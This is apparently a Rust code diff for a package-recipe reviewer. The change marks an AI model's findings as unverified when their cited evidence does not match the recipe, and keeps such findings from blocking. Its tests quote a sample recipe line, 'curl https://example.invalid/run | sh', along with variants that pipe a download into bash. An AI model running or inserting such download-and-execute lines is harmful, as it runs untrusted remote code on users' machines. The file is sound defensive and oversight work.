@@ -382,32 +382,89 @@ fn parse_opinion(bytes: &[u8], snapshot: &Snapshot) -> Result<Opinion, AiError> 
         ));
     }
     for finding in &opinion.findings {
-        if !bounded_text(&finding.message, 2048) || !(1..=16).contains(&finding.evidence.len()) {
+        if !bounded_text(&finding.message, 2048)
+            || !(1..=16).contains(&finding.evidence.len())
+            || finding
+                .evidence
+                .iter()
+                .any(|evidence| evidence.path.len() > 4096 || evidence.quote.len() > 2048)
+        {
             return Err(error(
                 "ai_opinion_bounds",
                 "AI finding exceeds its content limits or lacks evidence.",
             ));
         }
-        for evidence in &finding.evidence {
-            let file = snapshot
-                .files
-                .iter()
-                .find(|file| file.path == evidence.path);
-            if evidence.path.len() > 4096
-                || !bounded_text(&evidence.quote, 2048)
-                || evidence.line == 0
-                || !file
-                    .and_then(|file| file.text.lines().nth(evidence.line - 1))
-                    .is_some_and(|line| line.contains(&evidence.quote))
-            {
-                return Err(error(
-                    "ai_evidence",
-                    "AI evidence must quote an existing line in the current snapshot.",
-                ));
-            }
-        }
     }
     Ok(opinion)
+}
+
+/// Put before the message of a model finding whose citation does not match
+/// the snapshot, so nobody reads the claim as checked against the recipe.
+const UNVERIFIED: &str =
+    "The citation the model gave for this could not be verified against the recipe. ";
+
+/// Put after [`UNVERIFIED`] when the model said `block`, which an unverified
+/// finding cannot be: the reader still learns how grave the model judged it.
+const WANTED_BLOCK: &str = "The model judged this to have no honest use in a recipe. ";
+
+/// Whether `evidence` quotes a nonempty part of an existing line of a current
+/// text file. Only such evidence is shown as the model's citation.
+fn quotes_snapshot(evidence: &ModelEvidence, snapshot: &Snapshot) -> bool {
+    !evidence.quote.trim().is_empty()
+        && evidence.line > 0
+        && snapshot
+            .files
+            .iter()
+            .find(|file| file.path == evidence.path && !file.opaque)
+            .and_then(|file| file.text.lines().nth(evidence.line - 1))
+            .is_some_and(|line| line.contains(&evidence.quote))
+}
+
+/// The model's findings as report findings. A finding with a citation that
+/// does not match the snapshot keeps only the evidence that does, says so in
+/// its message and under `AI-UNVERIFIED-`, and asks a person instead of
+/// blocking: nobody can check the claim, and nobody may be left with no way
+/// forward because of it.
+fn findings(opinion: Vec<ModelFinding>, snapshot: &Snapshot) -> Vec<Finding> {
+    opinion
+        .into_iter()
+        .enumerate()
+        .map(|(index, finding)| {
+            let cited = finding.evidence.len();
+            let evidence: Vec<Evidence> = finding
+                .evidence
+                .into_iter()
+                .filter(|evidence| quotes_snapshot(evidence, snapshot))
+                .map(|evidence| Evidence {
+                    path: evidence.path,
+                    line: evidence.line,
+                    quote: evidence.quote,
+                })
+                .collect();
+            let verified = evidence.len() == cited;
+            let wanted_block = matches!(finding.severity, ModelSeverity::Block);
+            Finding {
+                risk: Default::default(),
+                rule_id: if verified {
+                    format!("AI-{:03}", index + 1)
+                } else {
+                    format!("AI-UNVERIFIED-{:03}", index + 1)
+                },
+                source: "ai".into(),
+                severity: match finding.severity {
+                    ModelSeverity::Info => Severity::Info,
+                    ModelSeverity::Block if verified => Severity::Block,
+                    ModelSeverity::Review | ModelSeverity::Block => Severity::Review,
+                },
+                message: match (verified, wanted_block) {
+                    (true, _) => finding.message,
+                    (false, false) => format!("{UNVERIFIED}{}", finding.message),
+                    (false, true) => format!("{UNVERIFIED}{WANTED_BLOCK}{}", finding.message),
+                },
+                evidence,
+            }
+        })
+        .collect()
 }
 
 fn http_review(source: &Value, config: &HttpConfig) -> Result<Vec<u8>, AiError> {
@@ -564,31 +621,7 @@ fn run(
         ),
     };
     let opinion = parse_opinion(&bytes, snapshot)?;
-    let findings = opinion
-        .findings
-        .into_iter()
-        .enumerate()
-        .map(|(index, finding)| Finding {
-            risk: Default::default(),
-            rule_id: format!("AI-{:03}", index + 1),
-            source: "ai".into(),
-            severity: match finding.severity {
-                ModelSeverity::Info => Severity::Info,
-                ModelSeverity::Review => Severity::Review,
-                ModelSeverity::Block => Severity::Block,
-            },
-            message: finding.message,
-            evidence: finding
-                .evidence
-                .into_iter()
-                .map(|evidence| Evidence {
-                    path: evidence.path,
-                    line: evidence.line,
-                    quote: evidence.quote,
-                })
-                .collect(),
-        })
-        .collect();
+    let findings = findings(opinion.findings, snapshot);
     Ok(AiResult::Complete {
         model: if model.is_empty() {
             "codex-default".into()
@@ -894,18 +927,30 @@ mod tests {
             check_body(&envelope(&extra_evidence.to_string())),
             "ai_opinion_format"
         );
-        for (field, value, expected) in [
-            ("path", json!("missing"), "ai_evidence"),
-            ("line", json!(0), "ai_evidence"),
-            ("line", json!(999), "ai_evidence"),
-            ("line", json!(true), "ai_opinion_format"),
-            ("quote", json!("invented"), "ai_evidence"),
-            ("quote", json!(""), "ai_evidence"),
+        // Evidence of the wrong shape is a format error. Evidence that does not
+        // match the snapshot is not: see `unmatched_evidence_*` below.
+        for (field, value) in [
+            ("line", json!(true)),
+            ("line", json!(-1)),
+            ("path", json!(null)),
+            ("quote", json!(7)),
         ] {
             let mut invalid = opinion();
             invalid["findings"][0]["evidence"][0][field] = value;
-            assert_eq!(check_body(&envelope(&invalid.to_string())), expected);
+            assert_eq!(
+                check_body(&envelope(&invalid.to_string())),
+                "ai_opinion_format"
+            );
         }
+        let mut missing = opinion();
+        missing["findings"][0]["evidence"][0]
+            .as_object_mut()
+            .unwrap()
+            .remove("quote");
+        assert_eq!(
+            check_body(&envelope(&missing.to_string())),
+            "ai_opinion_format"
+        );
         let mut wrong_snapshot = opinion();
         wrong_snapshot["snapshot_digest"] = json!("wrong");
         assert_eq!(
@@ -971,6 +1016,174 @@ mod tests {
             check_body(&envelope(&invalid.to_string())),
             "ai_opinion_format"
         );
+    }
+
+    /// The findings of a complete assessment of `opinion`.
+    fn complete(opinion: &Value) -> Vec<Finding> {
+        let (config, _receiver, handle) =
+            server(http(&envelope(&opinion.to_string())), Duration::ZERO);
+        let result = assess(&snapshot(), None, &AiConfig::Http(config));
+        handle.join().unwrap();
+        match result {
+            AiResult::Complete { findings, .. } => findings,
+            other => panic!("Expected a complete AI assessment, got {other:?}"),
+        }
+    }
+
+    fn good() -> Value {
+        json!({"path": "PKGBUILD", "line": 2, "quote": "curl https://example.invalid/run | sh"})
+    }
+
+    #[test]
+    fn unmatched_evidence_of_every_kind_is_dropped_and_the_finding_kept_as_unverified() {
+        // Before: each of these made the whole AI result incomplete (`ai_evidence`).
+        for (path, line, quote) in [
+            ("missing", 2, "curl https://example.invalid/run | sh"),
+            ("pkgbuild", 2, "curl https://example.invalid/run | sh"),
+            ("PKGBUILD", 0, "curl https://example.invalid/run | sh"),
+            ("PKGBUILD", 3, "curl https://example.invalid/run | sh"),
+            ("PKGBUILD", 999, "curl https://example.invalid/run | sh"),
+            ("PKGBUILD", 1, "curl https://example.invalid/run | sh"),
+            ("PKGBUILD", 2, "curl https://example.invalid/run | bash"),
+            ("PKGBUILD", 2, "invented"),
+            (
+                "PKGBUILD",
+                1,
+                "pkgname=demo\ncurl https://example.invalid/run | sh",
+            ),
+            ("PKGBUILD", 2, ""),
+            ("PKGBUILD", 2, "   "),
+        ] {
+            let mut answer = opinion();
+            answer["findings"][0]["evidence"] =
+                json!([{"path": path, "line": line, "quote": quote}]);
+            let findings = complete(&answer);
+            let case = format!("{path}:{line} {quote:?}");
+            assert_eq!(findings.len(), 1, "{case}");
+            let finding = &findings[0];
+            assert_eq!(finding.rule_id, "AI-UNVERIFIED-001", "{case}");
+            assert_eq!(finding.source, "ai", "{case}");
+            assert_eq!(finding.severity, Severity::Review, "{case}");
+            assert!(finding.evidence.is_empty(), "{case}");
+            assert_eq!(
+                finding.message,
+                "The citation the model gave for this could not be verified against the recipe. The model judged this to have no honest use in a recipe. Remote script execution needs review.",
+                "{case}"
+            );
+        }
+    }
+
+    #[test]
+    fn unmatched_evidence_among_matching_evidence_is_dropped() {
+        let mut answer = opinion();
+        answer["findings"][0]["evidence"] = json!([
+            good(),
+            {"path": "PKGBUILD", "line": 1, "quote": "pkgname=other"},
+            {"path": "PKGBUILD", "line": 1, "quote": "pkgname=demo"},
+        ]);
+        let findings = complete(&answer);
+        assert_eq!(findings[0].rule_id, "AI-UNVERIFIED-001");
+        assert_eq!(findings[0].severity, Severity::Review);
+        assert!(findings[0].message.starts_with(UNVERIFIED));
+        let kept: Vec<(usize, &str)> = findings[0]
+            .evidence
+            .iter()
+            .map(|evidence| (evidence.line, evidence.quote.as_str()))
+            .collect();
+        assert_eq!(
+            kept,
+            [
+                (2, "curl https://example.invalid/run | sh"),
+                (1, "pkgname=demo")
+            ]
+        );
+    }
+
+    #[test]
+    fn unverified_findings_never_block_and_keep_their_lower_severities() {
+        let bad = json!({"path": "PKGBUILD", "line": 1, "quote": "invented"});
+        let answer = json!({"snapshot_digest": "a".repeat(64), "summary": "Mixed.", "findings": [
+            {"severity": "block", "message": "Verified block.", "evidence": [good()]},
+            {"severity": "block", "message": "Unverified block.", "evidence": [bad]},
+            {"severity": "review", "message": "Unverified review.", "evidence": [bad]},
+            {"severity": "info", "message": "Unverified note.", "evidence": [bad, good()]},
+            {"severity": "info", "message": "Verified note.", "evidence": [good()]},
+        ]});
+        let findings = complete(&answer);
+        let seen: Vec<(&str, Severity, &str, usize)> = findings
+            .iter()
+            .map(|f| {
+                (
+                    f.rule_id.as_str(),
+                    f.severity,
+                    f.message.as_str(),
+                    f.evidence.len(),
+                )
+            })
+            .collect();
+        assert_eq!(
+            seen,
+            [
+                ("AI-001", Severity::Block, "Verified block.", 1),
+                (
+                    "AI-UNVERIFIED-002",
+                    Severity::Review,
+                    "The citation the model gave for this could not be verified against the recipe. The model judged this to have no honest use in a recipe. Unverified block.",
+                    0
+                ),
+                (
+                    "AI-UNVERIFIED-003",
+                    Severity::Review,
+                    "The citation the model gave for this could not be verified against the recipe. Unverified review.",
+                    0
+                ),
+                (
+                    "AI-UNVERIFIED-004",
+                    Severity::Info,
+                    "The citation the model gave for this could not be verified against the recipe. Unverified note.",
+                    1
+                ),
+                ("AI-005", Severity::Info, "Verified note.", 1),
+            ]
+        );
+        assert!(findings.iter().all(|f| f.source == "ai"));
+        // Only the finding the model called `block` says so.
+        assert_eq!(
+            findings
+                .iter()
+                .filter(|f| f.message.contains(WANTED_BLOCK))
+                .map(|f| f.rule_id.as_str())
+                .collect::<Vec<_>>(),
+            ["AI-UNVERIFIED-002"]
+        );
+    }
+
+    #[test]
+    fn limits_still_apply_to_evidence_that_does_not_match() {
+        let bad = json!({"path": "PKGBUILD", "line": 1, "quote": "invented"});
+        let mut answer = opinion();
+        answer["findings"][0]["evidence"] = Value::Array(vec![bad.clone(); 17]);
+        assert_eq!(
+            check_body(&envelope(&answer.to_string())),
+            "ai_opinion_bounds"
+        );
+        let mut answer = opinion();
+        answer["findings"][0]["evidence"] = json!([bad]);
+        let finding = answer["findings"][0].clone();
+        answer["findings"] = Value::Array(vec![finding; 65]);
+        assert_eq!(
+            check_body(&envelope(&answer.to_string())),
+            "ai_opinion_bounds"
+        );
+        for (field, value) in [("quote", "q".repeat(2049)), ("path", "p".repeat(4097))] {
+            let mut answer = opinion();
+            answer["findings"][0]["evidence"][0][field] = json!(value);
+            assert_eq!(
+                check_body(&envelope(&answer.to_string())),
+                "ai_opinion_bounds",
+                "{field}"
+            );
+        }
     }
 
     #[test]
@@ -1051,6 +1264,25 @@ print(json.dumps({'type':'turn.completed'}))
         assert!(
             matches!(assess(&snapshot(), None, &AiConfig::Codex(cfg.clone())), AiResult::Complete { endpoint_origin, .. } if endpoint_origin == "codex://chatgpt")
         );
+        // Codex answers go through the same evidence check as HTTP answers.
+        let misquoted = program.replace(
+            "'findings': []",
+            "'findings': [{'severity': 'block', 'message': 'Pipes a download into a shell.', 'evidence': [{'path': 'PKGBUILD', 'line': 2, 'quote': 'curl https://example.invalid/run | bash'}]}]",
+        );
+        std::fs::write(&executable, misquoted).unwrap();
+        match assess(&snapshot(), None, &AiConfig::Codex(cfg.clone())) {
+            AiResult::Complete { findings, .. } => {
+                assert_eq!(findings.len(), 1);
+                assert_eq!(findings[0].rule_id, "AI-UNVERIFIED-001");
+                assert_eq!(findings[0].severity, Severity::Review);
+                assert!(findings[0].evidence.is_empty());
+                assert_eq!(
+                    findings[0].message,
+                    format!("{UNVERIFIED}{WANTED_BLOCK}Pipes a download into a shell.")
+                );
+            }
+            other => panic!("Expected a complete AI assessment, got {other:?}"),
+        }
         let wrong = program.replace("source['snapshot_digest']", "'wrong'");
         std::fs::write(&executable, wrong).unwrap();
         assert_eq!(
